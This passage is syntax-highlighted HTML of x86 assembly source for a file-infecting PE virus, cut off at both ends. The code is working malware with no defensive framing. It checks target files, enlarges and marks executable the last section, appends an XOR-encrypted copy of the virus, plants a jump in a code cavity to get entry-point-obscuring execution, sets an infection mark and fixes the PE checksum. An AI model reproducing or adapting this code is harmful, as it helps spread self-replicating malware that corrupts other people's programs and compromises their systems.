    </span><span class="sc5">CheckForZipSFX</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">zip</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckForZipSFX</span><span class="sc0">

    </span><span class="sc5">ChangeLastSectionHeaderProperties</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> 

    </span><span class="sc5">NewAlignedPhysicalSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; old virt size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; and align it to</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the filealign</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; save it</span><span class="sc0">

    </span><span class="sc5">NewAlignedVirtualSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; get old </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; store it</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">             
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; and align it to</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the sectionalign</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save new value</span><span class="sc0">

    </span><span class="sc5">NewAlignedImageSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get virtual offset    </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; + new virtual size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; = new imagesize</span><span class="sc0">

    </span><span class="sc5">NewAlignedFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get new phys size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add offset of phys</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; size = filesize</span><span class="sc0">

    </span><span class="sc5">CalculateNewIp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; + virtual offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_ipnew_rva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; new ip</span><span class="sc0">

    </span><span class="sc5">CreateEpoIp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_ipnew_va</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">CalculateEncryptionKey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_aoc_pa</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_pa</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_rva</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">                    </span><span class="sc1">; ebx-&gt; original return address</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; after call = encryption key</span><span class="sc0">

    </span><span class="sc5">CalculateDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_ipnew_va</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">CopyVirusDecryptorToEndOfFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; virtual size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; mapaddress</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; add raw data offset</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; copy virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">RealStart</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc5">PrepareToEncryptAndCopy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">RealStart</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">

    </span><span class="sc5">EncryptAndCopyVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movsd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">EncryptAndCopyVirus</span><span class="sc0">

    </span><span class="sc5">SearchForCavity</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_pa</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cs_rawsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CAVITYSEARCH</span><span class="sc0">               
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UpdatePEHeaderWithChanges</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_pa</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_cs_rva</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cavity_va</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">WriteVirusJumpIntoCavity</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0524048Bh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E0FFh</span><span class="sc0">
    
    </span><span class="sc5">SetEpo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cavity_va</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_aoc_pa</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">           </span><span class="sc1">; turn jmp into call</span><span class="sc0">
    
    </span><span class="sc5">UpdatePEHeaderWithChanges</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ll'</span><span class="sc0">          </span><span class="sc1">; set infectionmark</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">]</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; set new imagesize</span><span class="sc0">

    </span><span class="sc5">CalculateNewCheckSum</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">

    </span><span class="sc5">LoadImageHlpDll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagehlp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ALoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">UnmapView</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagehlpaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">CalculateNewChecksum</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACheckSumMappedFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETIAPI</span><span class="sc0">

</span><span class="sc1">;--------------------------------[ unmap file ]------------------------------;</span><span class="sc0">

    </span><span class="sc5">UnmapView</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">CloseMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
